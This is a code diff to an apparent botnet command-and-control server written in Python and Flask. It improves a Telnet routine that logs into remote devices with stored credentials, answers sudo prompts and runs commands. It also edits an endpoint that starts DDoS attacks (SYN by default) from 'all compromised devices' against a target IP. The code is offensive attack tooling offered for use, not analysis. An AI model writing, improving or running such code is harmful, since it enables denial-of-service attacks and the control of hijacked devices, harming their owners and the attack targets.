@@ -148,46 +148,73 @@ class DatabaseManager:
     def execute_telnet_command(self, ip, username, password, command):
         """Establish Telnet connection and execute command, handling sudo password."""
         try:
+            logging.info(f"Attempting Telnet connection to {ip}:23")
             tn = telnetlib.Telnet(ip, 23, timeout=10)
-            tn.read_until(b"login: ", timeout=5)
+            logging.info(f"Telnet connection to {ip} established.")
+
+            # Read until login prompt
+            login_prompt = tn.read_until(b"login: ", timeout=5)
+            logging.info(f"Read from {ip} (login prompt): {login_prompt}")
             tn.write(username.encode() + b"\n")
-            tn.read_until(b"Password: ", timeout=5)
+            logging.info(f"Sent username {username} to {ip}")
+
+            # Read until password prompt
+            password_prompt = tn.read_until(b"Password: ", timeout=5)
+            logging.info(f"Read from {ip} (password prompt): {password_prompt}")
             if password:
                 tn.write(password.encode() + b"\n")
+                logging.info(f"Sent password to {ip}")
             else:
                 tn.write(b"\n")
-            
+                logging.warning(f"No password provided for {ip}, sent empty line.")
+
             # Wait for shell prompt or command completion indicator
             # This part might need adjustment based on actual device prompts
-            tn.read_until(b"$", timeout=5) # Attempt to read until a common prompt
-            tn.read_until(b"#", timeout=5)
-            tn.read_until(b">", timeout=5)
-            
+            shell_prompt_response = tn.read_until(b"$", timeout=5)
+            logging.info(f"Read from {ip} (shell prompt $): {shell_prompt_response}")
+            if b"$" not in shell_prompt_response:
+                 shell_prompt_response = tn.read_until(b"#", timeout=5)
+                 logging.info(f"Read from {ip} (shell prompt #): {shell_prompt_response}")
+            if b"#" not in shell_prompt_response and b"$" not in shell_prompt_response:
+                 shell_prompt_response = tn.read_until(b">", timeout=5)
+                 logging.info(f"Read from {ip} (shell prompt >): {shell_prompt_response}")
+
             logging.info(f"Sending command to {ip} via Telnet: {command}")
             tn.write((command + "\n").encode())
-            
+            logging.info(f"Command written to {ip}")
+
             # Handle potential sudo password prompt
-            response = tn.read_until(b"password", timeout=3) # Look for 'password' prompt
-            if b"password" in response.lower():
+            # We'll read for a short duration to capture any immediate response like a password prompt
+            sudo_response = tn.read_very_eager() # Read anything immediately available
+            logging.info(f"Read from {ip} (after command, eager): {sudo_response}")
+
+            if b"password" in sudo_response.lower():
                 logging.info(f"Sudo password prompt detected on {ip}")
                 if password:
                     tn.write((password + "\n").encode())
                     logging.info(f"Sent sudo password to {ip}")
+                    # Read again after sending password to see if prompt changes or command starts
+                    final_response = tn.read_until(b"$", timeout=5) # Wait for shell prompt again
+                    if b"$" not in final_response:
+                        final_response = tn.read_until(b"#", timeout=5)
+                    if b"#" not in final_response and b"$" not in final_response:
+                        final_response = tn.read_until(b">", timeout=5)
+                    logging.info(f"Read from {ip} (after sudo password): {final_response}")
                 else:
-                    logging.info(f"No password available for sudo on {ip}")
-                    # May need to handle this case, command might fail
-            
-            # Give command some time to execute (adjust as needed)
-            time.sleep(2)
-            
-            # Optionally read command output (can be noisy)
-            # output = tn.read_very_lazy()
-            # logging.info(f"Output from {ip}: {output.decode()}")
-            
-            logging.info(f"Command sent to {ip} successfully")
+                    logging.warning(f"No password available for sudo on {ip}, command likely failed.")
+
+            # Give command some time to execute and background
+            time.sleep(5) # Increased sleep time
+
+            # Attempt to read any remaining output after execution attempt
+            final_output = tn.read_very_lazy()
+            if final_output:
+                 logging.info(f"Final output from {ip}: {final_output.decode(errors='ignore')}")
+
+            logging.info(f"Telnet command execution attempt on {ip} finished.")
             tn.close()
-            return True
-            
+            return True # Assume command sent successfully, actual execution status unknown via Telnet
+
         except Exception as e:
             logging.error(f"Failed to execute Telnet command on {ip}: {e}")
             return False
@@ -630,12 +657,19 @@ def start_telnet_ddos():
     """Start DDoS attack on all compromised devices via Telnet."""
     try:
         data = request.get_json()
+        logging.info(f"Received data for start-telnet-ddos: {data}")
         target_ip = data.get('target')
+        logging.info(f"start-telnet-ddos: Retrieved target_ip: '{target_ip}', type: {type(target_ip)}")
         attack_type = data.get('attack_type', 'syn')
-        
-        if not target_ip:
-            return jsonify({'error': 'Target IP required'}), 400
-            
+
+        # Check if target_ip is None or an empty string explicitly
+        if target_ip is None or target_ip == '':
+            logging.warning("Start-telnet-ddos: Target IP required but not received (explicit check).")
+            # Return a more specific error message
+            return jsonify({'error': 'Target IP missing or empty in request'}), 400
+
+        logging.info("start-telnet-ddos: Target IP check passed.") # Log if the check is passed
+
         # Get all compromised devices from the database
         conn = db_manager.get_connection()
         cursor = conn.cursor()
